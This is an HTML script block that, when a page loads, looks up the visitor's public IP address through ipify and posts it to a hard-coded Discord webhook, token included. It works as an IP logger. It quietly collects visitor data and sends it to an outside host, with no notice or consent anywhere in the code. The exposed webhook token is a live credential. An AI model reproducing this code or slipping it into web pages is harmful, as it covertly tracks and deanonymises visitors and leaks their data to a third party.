<script>
    // Function to retrieve the user's IP address
function getUserIP(callback) {
  const url = 'https://api.ipify.org?format=json';
  fetch(url)
    .then(response => response.json())
    .then(data => callback(null, data.ip))
    .catch(error => callback(error, null));
}

// Prepare the payload to send to the Discord webhook
const payload = {
  content: 'User IP address: ',
  embeds: [{
    title: 'User IP address',
    description: '',
    fields: [{
      name: 'IP address',
      value: '',
      inline: true
    }]
  }]
};

// Call the getUserIP function and update the payload with the returned IP address
getUserIP(function(error, ip) {
  if (error) {
    console.error(error);
  } else {
    payload.embeds[0].description = 'The IP address of the user is:';
    payload.embeds[0].fields[0].value = ip;

    // Send the payload to the Discord webhook
    const webhookURL = 'https://discord.com/api/webhooks/1073232485040791572/feIHRM0XPzNm44-bJ7a32_KFbF5-hISV5oPgr8doDJpJZUaSCp7kOcdMZ0f_X2mVUuB6';
    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    })
    .then(response => console.log(response))
    .catch(error => console.error(error));
  }
});

</script>
